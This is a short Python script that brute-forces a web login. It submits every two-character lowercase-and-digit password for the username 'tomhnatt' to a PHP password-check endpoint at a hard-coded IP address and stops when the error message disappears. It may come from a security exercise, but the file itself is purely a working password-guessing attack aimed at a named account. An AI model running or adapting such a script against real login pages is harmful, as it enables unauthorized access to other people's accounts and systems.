import requests
import string
import itertools

# define the website URL and the login form data
url = "http://158.39.188.210/functions/passcheck10.php"
login_data = {"username": "tomhnatt", "password": ""}

# define the set of characters to use for the password (2 letters or digits)
charset = string.ascii_lowercase + string.digits# + string.punctuation
password_length = 2

# iterate over all possible combinations of the password characters
for password in itertools.product(charset, repeat=password_length):
    # generate the password string from the tuple
    password_str = ''.join(password)

    # update the login data with the new password
    login_data["password"] = password_str


    # send the login request and check the response
    response = requests.post(url, data=login_data)
    print(login_data)
    #print(response.text)
    
    if "message_error" not in response.text:
        # password was found
        print("Password found: ", password_str)
        break
